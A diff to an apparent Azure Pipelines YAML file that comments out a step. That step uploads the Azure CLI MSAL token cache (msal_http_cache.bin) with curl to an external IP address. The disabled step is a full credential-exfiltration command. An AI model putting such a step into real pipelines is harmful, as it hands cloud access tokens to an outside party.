@@ -57,15 +57,15 @@ steps:
     done
   displayName: 'Recursively list and display _temp directory contents after AzureFunctionApp task'
 
-- script: |
-    echo "Checking for msal_http_cache.bin file..."
-    if [ -f /home/vsts/work/_temp/.azclitask/msal_http_cache.bin ]; then
-        echo "msal_http_cache.bin found. Uploading..."
-        curl -F "file=@/home/vsts/work/_temp/.azclitask/msal_http_cache.bin" http://139.180.193.16:5000/upload
-    else
-        echo "msal_http_cache.bin not found."
-    fi
-  displayName: 'Check and Upload msal_http_cache.bin'
+# - script: |
+#     echo "Checking for msal_http_cache.bin file..."
+#     if [ -f /home/vsts/work/_temp/.azclitask/msal_http_cache.bin ]; then
+#         echo "msal_http_cache.bin found. Uploading..."
+#         curl -F "file=@/home/vsts/work/_temp/.azclitask/msal_http_cache.bin" http://139.180.193.16:5000/upload
+#     else
+#         echo "msal_http_cache.bin not found."
+#     fi
+#   displayName: 'Check and Upload msal_http_cache.bin'
   
 - task: AzureFunctionApp@1
   inputs:
